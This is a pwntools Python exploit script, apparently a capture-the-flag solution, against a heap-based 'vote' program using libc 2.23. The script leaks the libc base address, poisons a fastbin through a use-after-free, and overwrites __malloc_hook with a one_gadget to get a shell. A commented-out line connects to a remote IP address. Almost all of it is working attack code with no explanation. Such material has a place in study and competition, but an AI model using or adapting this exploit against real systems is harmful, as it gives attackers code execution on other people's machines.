from pwn import *

def Create(size, name):
    r.sendlineafter("Action: ", "0")
    r.sendlineafter("size: ",str(size))
    r.sendlineafter("name: ", str(name))

def Cancel(index):
    r.sendlineafter("Action: ", "4")
    r.sendlineafter("index: ", str(index))

def Show(index, fl = False):
    r.sendlineafter("Action: ", "1")
    r.sendlineafter("index: ", str(index))
    if fl == True:
        r.recvuntil("count: ")
        leak = int(r.recvline(),10)
        libcbase = leak - 3951480
        success("libcbase : " + hex(libcbase))
        return libcbase

def Vote(index):
    r.sendlineafter("Action: ", "2")
    r.sendlineafter("index: ", str(index))


r = process(["./vote"], env={'LD_PRELOAD':'./libc-2.23.so'})
#r = process("./vote")
#r = remote("47.97.190.1",6000)
#context.log_level = 'debug'

raw_input(">> START")

### memory leak ###

Create(4000, "A"*16) #0
Create(4000, "B"*16) #1

Cancel(0)
libcbase = Show(0, True)

### allocate fake chunk ###

fake_address = libcbase + 3951341
#fake_address = 0x6020a5
#fake_address = libcbase + 3946173

pay1 = ""
pay1 += "\x00"*8
pay1 += p64(0x71)
pay1 += p64(fake_address)

Create(0x50, "E"*16) #2
Create(0x50, pay1)  #3
Create(0x50, "F"*16) #4

Cancel(2)
Cancel(3)
Cancel(4)

raw_input(">>>")

for i in range(0x20):
    Vote(4)


### overwrite malloc_hook ###

#one_gadget = libcbase + 0x45216
#one_gadget = libcbase + 0x4526a
one_gadget = libcbase + 0xf0274
#one_gadget = libcbase + 0xf1117

Create(0x50, "Z"*16) #5
Create(0x50, "A"*16) #6

raw_input("fianl**")

pay2 = ""
pay2 += "A"*0x3
pay2 += p64(one_gadget)
Create(0x50, pay2) #one_gadget #7

r.sendlineafter("Action: ", "0")
r.sendlineafter("size: ", "80")

r.interactive() 